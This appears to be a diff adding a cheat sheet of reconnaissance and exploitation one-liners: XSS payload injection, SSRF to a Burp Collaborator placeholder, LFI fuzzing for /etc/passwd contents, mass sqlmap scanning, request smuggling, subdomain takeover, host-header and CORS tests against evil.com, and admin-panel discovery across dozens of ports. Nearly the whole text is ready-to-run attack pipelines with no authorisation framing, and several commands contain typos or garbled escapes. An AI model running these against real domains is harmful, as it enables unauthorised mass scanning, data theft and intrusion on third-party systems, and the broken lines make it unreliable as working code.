@@ -1,0 +1,49 @@
+1. XSS Automation
+
+cat file.txt | gf xss | grep ‘source=’ | qsreplace ‘”><script>confirm(1)</script>’ | while read host do ; do curl –silent –path-as-is –insecure “$host” | grep -qs “<script>confirm(1)” && echo “$host 33[0;31mVulnerablen”;done
+echo domain.com | waybackurls | kxss
+assetfinder testphp.vulnweb.com | gau | dalfox pipe
+
+
+2. SSRF Automation
+
+findomain -t example.com -q | httpx -silent -threads 1000 | gau |  grep “=” | qsreplace http://YOUR.burpcollaborator.net
+
+
+3. LFI Automation
+
+findomain -t example.com -q |  waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
+
+
+4. MASS SQL SCANNING
+
+httpx -l domains -silent -threads 1000 | xargs -I@ sh -c ‘findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli –batch –random-agent –level 1’
+
+
+5. HTTPX SMUGLING
+
+cat domain.txt | python3 smuggler.py
+
+
+6. ADVANCE SUBDOMAIN TAKEOVER
+
+findomain -t exmple.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200'
+
+
+7. HOST HEADER INJECTION
+
+assestfinder domain.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "X-Forwarded-Host:evil.com" {} | [[$(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO HHI] - {}\e[m"' 2>/dev/null
+
+8. CORS
+
+assestfinder domain.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} | [[$(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"' 2>/dev/null
+
+9. To GREP JS FILE 
+
+echo "target.com" | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
+
+10. To Get Admin Panel
+
+cat domains_list.txt | httpx -ports 80,443,8080,8443 -paths "wordlist.txt" -mr "password"
+
+cat domains_list.txt | httpx -ports 80,443,8080,8001,8009,280,591,583,832,981,1311,2480,4444,4445,4567,5000,5104,5800,7000,7001,7002,8008,8042,8088,8222,8243,8280,8281,8333,8530,8531,8887,8888,8443,8834,9080,9443,9981,12043,12046,16080,18091,10443,18092,81,300,593,1010,1311,2082,2087,2095,2096,3000,3128,3333,4243,4711,4712,4993,5108,6543,7396,7474,8000,8001,8008,8014,8069,8080,8081,8090,8091,8118,8123,8172,8443,8500,8880,8888,8983,9000,9043,9060,9090,9091,9200,9800,12443,20720,28017 -paths "wordlist.txt" -mr "password"
